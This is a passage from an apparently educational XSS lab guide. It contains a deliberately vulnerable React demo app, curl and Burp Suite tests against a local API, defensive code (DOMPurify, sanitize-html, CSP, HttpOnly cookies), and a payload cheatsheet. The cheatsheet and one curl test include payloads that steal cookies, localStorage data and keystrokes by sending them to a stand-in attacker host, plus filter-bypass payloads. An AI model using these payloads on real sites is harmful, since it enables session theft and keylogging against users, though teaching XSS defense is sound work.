      <p>Using dangerouslySetInnerHTML renders HTML including scripts!</p>
      {comments.map((c) => (
        <div key={c._id} style={{ border: '1px solid red', padding: '10px', margin: '5px' }}>
          <strong>{c.author}</strong>: {/* ❌ DANGEROUS: renders raw HTML from database! */}
          <span dangerouslySetInnerHTML={{ __html: c.text }} />
        </div>
      ))}
    </div>
  )

  // ══════════════════════════════════════
  // DEMO 3: DOM XSS via URL parameter
  // ══════════════════════════════════════
  const DomXssDemo = () => {
    const params = new URLSearchParams(window.location.search)
    const name = params.get('name') || 'Guest'

    const vulnerableRef = useRef(null)
    useEffect(() => {
      if (vulnerableRef.current) {
        // ❌ DANGEROUS: innerHTML with URL parameter!
        // URL: http://localhost:3000?name=<img src=x onerror=alert(document.domain)>
        vulnerableRef.current.innerHTML = `Welcome, ${name}!`
      }
    }, [name])

    return (
      <div>
        <h2>❌ DOM XSS Demo</h2>
        <p>
          Try URL: <code>?name=&lt;img src=x onerror=alert(1)&gt;</code>
        </p>
        <div ref={vulnerableRef} style={{ border: '1px solid red', padding: '10px' }} />

        <h3>✅ SAFE version:</h3>
        {/* React handles it safely: */}
        <div style={{ border: '1px solid green', padding: '10px' }}>
          Welcome, {name}!{/* name is treated as text, not HTML → SAFE */}
        </div>
      </div>
    )
  }

  return (
    <div style={{ fontFamily: 'Arial', maxWidth: '800px', margin: '0 auto', padding: '20px' }}>
      <h1>🎯 XSS Research Lab</h1>

      {/* Post a comment */}
      <div style={{ background: '#f5f5f5', padding: '15px', marginBottom: '20px' }}>
        <h2>Post a Comment (Try XSS payloads!)</h2>
        <input
          value={author}
          onChange={(e) => setAuthor(e.target.value)}
          placeholder="Your name"
          style={{ width: '100%', padding: '8px', marginBottom: '8px' }}
        />
        <textarea
          value={newComment}
          onChange={(e) => setNewComment(e.target.value)}
          placeholder="Try: <script>alert(document.domain)</script>"
          style={{ width: '100%', padding: '8px', height: '80px', marginBottom: '8px' }}
        />
        <button onClick={postComment} style={{ padding: '8px 16px' }}>
          Post Comment
        </button>
      </div>

      <SafeComments />
      <hr />
      <UnsafeComments />
      <hr />
      <DomXssDemo />

      <div style={{ marginTop: '20px', padding: '15px', background: '#e8f5e9' }}>
        <h3>🧪 Test These:</h3>
        <ul>
          <li>
            Post comment: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>
          </li>
          <li>
            Post comment: <code>&lt;img src=x onerror=alert(document.domain)&gt;</code>
          </li>
          <li>View safe render: stays as text</li>
          <li>View unsafe render (dangerouslySetInnerHTML): EXECUTES!</li>
          <li>
            DOM XSS: Add <code>?name=&lt;img src=x onerror=alert(1)&gt;</code> to URL
          </li>
          <li>
            Blind XSS: Post:{' '}
            <code>&lt;script src="http://localhost:8080/xss.js"&gt;&lt;/script&gt;</code>
          </li>
          <li>
            Start attacker server: <code>node attacker_server.js</code>
          </li>
        </ul>
      </div>
    </div>
  )
}

export default App
```

---

## 12. Testing with Burp Suite

```bash
# ════════════════════════════════════════════════
# REFLECTED XSS TESTING
# ════════════════════════════════════════════════

# Basic test:
curl "http://localhost:5000/api/vuln/search?q=<script>alert(1)</script>"

# Check if script appears unescaped in response:
curl "http://localhost:5000/api/vuln/search?q=test" | grep "test"

# Test various payloads:
curl "http://localhost:5000/api/vuln/search?q=<img src=x onerror=alert(1)>"
curl "http://localhost:5000/api/vuln/search?q=<svg onload=alert(1)>"

# ════════════════════════════════════════════════
# STORED XSS TESTING
# ════════════════════════════════════════════════

# Store the payload:
curl -X POST http://localhost:5000/api/vuln/comments \
  -H "Content-Type: application/json" \
  -d '{"author":"Attacker","text":"<script>alert(document.domain)</script>"}'

# Store data grabber payload:
curl -X POST http://localhost:5000/api/vuln/comments \
  -H "Content-Type: application/json" \
  -d '{"author":"Test","text":"<script>new Image().src=\"http://localhost:8080/steal?c=\"+document.cookie</script>"}'

# View stored content (see it rendered):
curl "http://localhost:5000/api/vuln/comments/html"

# ════════════════════════════════════════════════
# BURP SUITE SETUP FOR XSS TESTING
# ════════════════════════════════════════════════

# 1. Start Burp Suite
# 2. Set browser proxy to 127.0.0.1:8080
# 3. Browse to http://localhost:3000
# 4. Burp intercepts all requests

# In Burp:
# - Send any request to Repeater
# - Modify parameters to include XSS payloads
# - Check response for unescaped payload
# - Send to Intruder for automated testing

# Intruder payload list for XSS:
# Use: PayloadsAllTheThings/XSS Injection/Intruder/
# These are ready-made XSS payload lists for Burp Intruder!
```

---

## 13. Defense

### React Defense (Most Important for You)

```jsx
// ════════════════════════════════════════════
// RULE 1: Never use dangerouslySetInnerHTML with user data
// ════════════════════════════════════════════

// ❌ DANGEROUS:
<div dangerouslySetInnerHTML={{ __html: userComment }} />

// ✅ SAFE: React auto-escapes JSX expressions:
<div>{userComment}</div>

// If you MUST render HTML (e.g., rich text editor output):
// npm install dompurify
import DOMPurify from 'dompurify';
const cleanHtml = DOMPurify.sanitize(userComment);
<div dangerouslySetInnerHTML={{ __html: cleanHtml }} />

// ════════════════════════════════════════════
// RULE 2: Never use eval/Function with user data
// ════════════════════════════════════════════

// ❌ DANGEROUS:
eval(userCode);
new Function(userCode)();
setTimeout(userString, 100);  // String version of setTimeout!

// ✅ SAFE: Never execute user input as code
// If you need dynamic code execution, use sandboxing libraries

// ════════════════════════════════════════════
// RULE 3: Validate href before using
// ════════════════════════════════════════════

// ❌ DANGEROUS: User-controlled href
<a href={userUrl}>Click</a>
// If userUrl = "javascript:alert(1)" → XSS!

// ✅ SAFE: Validate URL protocol
function isSafeUrl(url) {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}
<a href={isSafeUrl(userUrl) ? userUrl : '#'}>Click</a>

// ════════════════════════════════════════════
// RULE 4: Sanitize DOM manipulation
// ════════════════════════════════════════════

// ❌ DANGEROUS:
element.innerHTML = userInput;
document.write(userInput);

// ✅ SAFE:
element.textContent = userInput;  // Always text, never HTML
```

### Express/Node Backend Defense

```javascript
// Install sanitize-html
// npm install sanitize-html

const sanitizeHtml = require('sanitize-html')

// ✅ For rich text (allow some safe HTML):
const cleanText = sanitizeHtml(dirtyHtml, {
  allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li'],
  allowedAttributes: {
    a: ['href', 'title'],
  },
  allowedSchemes: ['http', 'https'], // No javascript: URIs!
})

// ✅ For plain text (strip ALL HTML):
const plainText = sanitizeHtml(dirtyHtml, {
  allowedTags: [], // No HTML tags
  allowedAttributes: {}, // No attributes
})

// ✅ Simple HTML escaping (no library needed):
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
}

// ✅ Content Security Policy header:
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
      "script-src 'self'; " + // Only scripts from YOUR domain!
      "style-src 'self' 'unsafe-inline'; " +
      "img-src 'self' data: https:; " +
      "connect-src 'self' https://api.yourdomain.com",
  )
  next()
})

// ✅ HttpOnly cookies (XSS can't steal them!):
res.cookie('session', sessionId, {
  httpOnly: true, // JS cannot read this cookie
  secure: true, // HTTPS only
  sameSite: 'strict',
})
```

### Defense Summary

| Attack Type      | Defense                                                          |
| ---------------- | ---------------------------------------------------------------- |
| Stored XSS       | Sanitize on save AND on output                                   |
| Reflected XSS    | HTML-encode all URL parameters before rendering                  |
| DOM XSS          | Use textContent not innerHTML, validate URL schemes              |
| XSS via SVG      | Convert SVG to PNG before display, or serve from separate domain |
| XSS via Markdown | Run through DOMPurify after markdown rendering                   |
| Blind XSS        | CSP headers block external script loading                        |
| All XSS          | Content-Security-Policy: script-src 'self'                       |

---

## Quick Reference — XSS Payload Cheatsheet

```html
<!-- Basic confirmation: -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>

<!-- Steal cookies: -->
<script>new Image().src='http://ATTACKER/steal?c='+document.cookie</script>

<!-- Steal localStorage: -->
<script>fetch('http://ATTACKER/steal',{method:'POST',mode:'no-cors',body:JSON.stringify(localStorage)})</script>

<!-- Keylogger: -->
<script>document.onkeypress=e=>fetch('http://ATTACKER/?k='+e.key,{mode:'no-cors'})</script>

<!-- Filter bypass - no script tag: -->
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>

<!-- Filter bypass - no parentheses: -->
<img src=x onerror=alert`1`>
<svg onload=window.onerror=eval;throw'=alert\x281\x29'>

<!-- DOM XSS: -->
#"><img src=/ onerror=alert(1)>
javascript:alert(1)
```

---

## Next Steps

```
From PayloadsAllTheThings:
  1. XSS Injection/Intruder/ folder → Ready-made payload lists for Burp!
  2. DOM Clobbering → Advanced DOM manipulation attacks
  3. CSRF → Use XSS to bypass CSRF protection
  4. Content Security Policy → Learn to bypass CSP

Practice Labs:
  PortSwigger XSS labs (free, best XSS practice):
  https://portswigger.net/web-security/cross-site-scripting

  Root Me XSS challenges:
  https://www.root-me.org → Web-Client → XSS challenges

Bug Bounty Focus:
  Stored XSS = highest bounty (affects all users)
  Blind XSS = affects admins = account takeover = critical
  Look for: dangerouslySetInnerHTML, innerHTML, eval in React apps
```
